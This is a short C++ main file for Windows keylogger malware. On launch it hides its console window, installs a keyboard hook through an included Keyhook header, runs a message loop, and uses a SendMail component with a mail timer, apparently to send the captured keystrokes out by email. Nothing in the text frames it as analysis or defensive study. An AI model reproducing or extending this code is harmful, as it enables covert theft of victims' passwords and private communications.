#include<iostream>
#include<fstream>
#include<string>
#include<windows.h>

#include "Helper.h"
#include "Base64.h"
#include "KeyConstants.h"
#include "IO.h"
#include "Timer.h"
#include "Keyhook.h"
#include "SendMail.h"

using namespace std;

void hide();

int main()
{
	hide();
	MSG Msg;
	IO::MKDir(IO::GetOurPath(true));
	InstallHook();
	while(GetMessageA(&Msg ,NULL,0,0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }
    MailTimer.Stop();
	return 0;
}
void hide()
{
	HWND hide;
	AllocConsole();
	hide= FindWindowA("ConsoleWindowClass",NULL);
	ShowWindow(hide,0);
}
